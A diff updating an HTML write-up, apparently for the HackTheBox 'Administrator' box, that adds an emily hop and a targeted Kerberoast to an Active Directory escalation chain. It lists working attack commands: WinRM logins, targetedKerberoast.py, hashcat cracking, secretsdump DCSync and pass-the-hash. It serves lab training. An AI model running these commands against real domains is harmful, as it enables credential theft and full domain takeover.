@@ -74,7 +74,7 @@
   table{width:100%;border-collapse:collapse;margin:14px 0;font-size:.88rem}
   th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--border)}
   th{color:var(--muted);font-size:.72rem;text-transform:uppercase;letter-spacing:.07em}
-  td code{font-size:.8rem}
+  td code{font-size:.8rem;word-break:break-all}
   tr:hover td{background:var(--panel)}
 
   .cred{font-family:var(--mono);color:var(--accent)}
@@ -92,7 +92,7 @@
     <div class="hero-top">
       <p class="kicker">HackTheBox · Writeup</p>
       <h1>Administrator <span class="owned">// rooted</span></h1>
-      <p class="sub">Active Directory privilege-escalation chain: ACL abuse → Password Safe → DCSync → Pass-the-Hash.</p>
+      <p class="sub">Active Directory privilege-escalation chain: ACL abuse → Password Safe → Targeted Kerberoast → DCSync → Pass-the-Hash.</p>
       <div class="badges">
         <span class="badge win">Windows / AD</span>
         <span class="badge med">Difficulty: Medium</span>
@@ -113,7 +113,7 @@
     <p class="lead">A full-stack domain controller exposing the usual AD surface (SMB, LDAP, Kerberos, WinRM, FTP, ADCS endpoints). Starting from a single low-privilege credential, the box is solved by walking an <strong>object-control graph</strong> in BloodHound — each account controls the next via a Windows ACL edge — until a user with <strong>DCSync</strong> rights allows replicating the Administrator hash straight out of NTDS.dit.</p>
     <div class="callout">
       <p class="t">TL;DR path</p>
-      <p><span class="cred">olivia</span> → <span class="cred">michael</span> → <span class="cred">benjamin</span> → <span class="cred">ethan</span> → <span class="cred">Administrator</span></p>
+      <p><span class="cred">olivia</span> → <span class="cred">michael</span> → <span class="cred">benjamin</span> → <span class="cred">emily</span> → <span class="cred">ethan</span> → <span class="cred">Administrator</span></p>
     </div>
   </section>
 
@@ -137,7 +137,7 @@
       </li>
       <li>
         <span class="dot">2</span>
-        <p class="step-h">michael — WinRM shell + user flag</p>
+        <p class="step-h">michael — WinRM shell</p>
         <p class="step-d">michael is a member of <strong>Remote Management Users</strong>, granting interactive WinRM access.</p>
         <span class="pill">Remote Management Users</span><span class="pill">evil-winrm</span>
       </li>
@@ -155,12 +155,24 @@
       </li>
       <li>
         <span class="dot">5</span>
-        <p class="step-h">crack master &rarr; ethan : limpb*****</p>
-        <p class="step-d">Cracked the safe's master password offline; opening it revealed stored domain credentials for ethan.</p>
+        <p class="step-h">crack master &rarr; emily</p>
+        <p class="step-d">Cracked the safe's master password offline. It held entries for alexander, emily and emma, and only emily's credential was valid on the domain.</p>
         <span class="pill">pwsafe2john</span><span class="pill">hashcat -m 5200</span>
       </li>
       <li>
         <span class="dot">6</span>
+        <p class="step-h">emily — WinRM shell + user flag</p>
+        <p class="step-d">emily is in <strong>Remote Management Users</strong>. <code>user.txt</code> is on her desktop.</p>
+        <span class="pill">Remote Management Users</span><span class="pill">evil-winrm</span>
+      </li>
+      <li>
+        <span class="dot">7</span>
+        <p class="step-h">emily &rarr; ethan — GenericWrite</p>
+        <p class="step-d">emily has GenericWrite over ethan. Adding an SPN to ethan makes him Kerberoastable; his TGS cracks to <span class="cred">ethan : limpb*****</span>.</p>
+        <span class="pill">GenericWrite</span><span class="pill">Targeted Kerberoast</span><span class="pill">hashcat -m 13100</span>
+      </li>
+      <li>
+        <span class="dot">8</span>
         <p class="step-h">ethan — DCSync &rarr; root</p>
         <p class="step-d">ethan holds replication rights (<code>DS-Replication-Get-Changes</code> + <code>-All</code>) over the domain. secretsdump replicates the Administrator NT hash; pass-the-hash for the final shell and root flag.</p>
         <span class="pill">DCSync</span><span class="pill">Pass-the-Hash</span>
@@ -180,10 +192,10 @@
   </section>
 
   <section>
-    <h2><span class="num">2</span> michael &rarr; WinRM + user.txt</h2>
+    <h2><span class="num">2</span> michael &rarr; WinRM</h2>
     <pre><code><span class="prompt">$</span> nxc winrm 10.129.84.158 -u michael -p 'NewPas*****'   <span class="cmt"># (Pwn3d!)</span>
-<span class="prompt">$</span> evil-winrm -i 10.129.84.158 -u michael -p 'NewPas*****'
-<span class="prompt">*Evil-WinRM*</span> type C:\Users\michael\Desktop\user.txt</code></pre>
+<span class="prompt">$</span> evil-winrm -i 10.129.84.158 -u michael -p 'NewPas*****'</code></pre>
+    <p>michael gets a shell but no flag. <code>user.txt</code> belongs to emily, further down the chain.</p>
     <div class="callout warn">
       <p class="t">Group membership ≠ a fixed login</p>
       <p>Remote Management Users is <em>authorization</em>. A failing login is <em>authentication</em> — check the credential (case, quoting, password-vs-hash) before blaming permissions. <code>data 52e</code> always means bad creds.</p>
@@ -208,11 +220,28 @@
 <span class="prompt">$</span> # open the safe and read stored entries:
 <span class="prompt">$</span> python3 -c "from pypwsafe import PWSafe3; db=PWSafe3('Backup.psafe3', password='tekier******'); \
     [print(r.getTitle(), r.getUsername(), r.getPassword()) for r in db.records]"</code></pre>
-    <p>The master password itself isn't the prize — the <strong>stored entries</strong> are. The safe yielded <span class="cred">ethan : limpb*****</span>.</p>
+    <p>The master password itself isn't the prize — the <strong>stored entries</strong> are. The safe held three: <span class="cred">alexander</span>, <span class="cred">emily</span> and <span class="cred">emma</span>. Spraying them against the DC shows only emily's is valid.</p>
   </section>
 
   <section>
-    <h2><span class="num">6</span> DCSync &rarr; Pass-the-Hash &rarr; root</h2>
+    <h2><span class="num">6</span> emily &rarr; WinRM + user.txt</h2>
+    <pre><code><span class="prompt">$</span> nxc winrm 10.129.84.158 -u emily -p '**********'   <span class="cmt"># (Pwn3d!)</span>
+<span class="prompt">$</span> evil-winrm -i 10.129.84.158 -u emily -p '**********'
+<span class="prompt">*Evil-WinRM*</span> type C:\Users\emily\Desktop\user.txt</code></pre>
+  </section>
+
+  <section>
+    <h2><span class="num">7</span> emily &rarr; ethan — targeted Kerberoast</h2>
+    <p>BloodHound shows emily with <strong>GenericWrite</strong> over ethan. That's enough to write a <code>servicePrincipalName</code> on his account, make him Kerberoastable on demand, and crack the ticket offline:</p>
+    <pre><code><span class="prompt">$</span> sudo ntpdate -u 10.129.84.158   <span class="cmt"># Kerberos again: fix clock skew first</span>
+<span class="prompt">$</span> python3 targetedKerberoast.py -v -d administrator.htb -u emily -p '**********' --dc-ip 10.129.84.158
+<span class="cmt"># sets a temporary SPN on ethan, requests the TGS, then removes the SPN</span>
+<span class="prompt">$</span> hashcat -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt
+<span class="cmt"># → ethan : limpb*****</span></code></pre>
+  </section>
+
+  <section>
+    <h2><span class="num">8</span> DCSync &rarr; Pass-the-Hash &rarr; root</h2>
     <p>ethan holds replication rights over the domain. Replicate the directory's secrets:</p>
     <pre><code><span class="prompt">$</span> impacket-secretsdump 'administrator.htb/ethan:limpb*****@10.129.84.158'
 <span class="cmt"># ...
@@ -234,7 +263,8 @@
         <tr><td>olivia</td><td><code>ichlie******</code></td><td>Given foothold</td></tr>
         <tr><td>michael</td><td><code>NewPas*****</code></td><td>GenericAll force-reset</td></tr>
         <tr><td>benjamin</td><td><em>control edge</em></td><td>michael &rarr; FTP access</td></tr>
-        <tr><td>ethan</td><td><code>limpb*****</code></td><td>Password Safe (master: tekier******)</td></tr>
+        <tr><td>emily</td><td><code>**********</code></td><td>Password Safe (master: tekier******)</td></tr>
+        <tr><td>ethan</td><td><code>limpb*****</code></td><td>Targeted Kerberoast via emily's GenericWrite</td></tr>
         <tr><td>Administrator</td><td><code>NT: 3dc553ce4b9fd20b****************</code></td><td>DCSync via ethan</td></tr>
       </tbody>
     </table>
@@ -245,6 +275,7 @@
     <ul>
       <li><strong>ACL abuse is a graph, not a command.</strong> Each hop answers "what does this node control next?" — mark owned, read outbound control, repeat.</li>
       <li><strong>GenericAll has three interchangeable primitives</strong> (Kerberoast / shadow creds / force reset). When one stalls, fall back — don't get stuck cracking an uncrackable TGS.</li>
+      <li><strong>GenericWrite over a user = Kerberoast on demand.</strong> Write an SPN, grab the TGS, crack it. This only works if the password is weak, which ethan's was.</li>
       <li><strong>NTLM hashes are for passing, not cracking.</strong> DCSync → PtH ends the box; plaintext is irrelevant.</li>
       <li><code>data 52e</code> = bad credentials, always. It caught a <code>NewPas*****</code> vs <code>Newpas*****</code> typo and a <code>pass@host</code> quoting bug.</li>
       <li><strong>Clock skew</strong> silently breaks Kerberos — <code>sudo ntpdate -u &lt;dc-ip&gt;</code> at session start.</li>
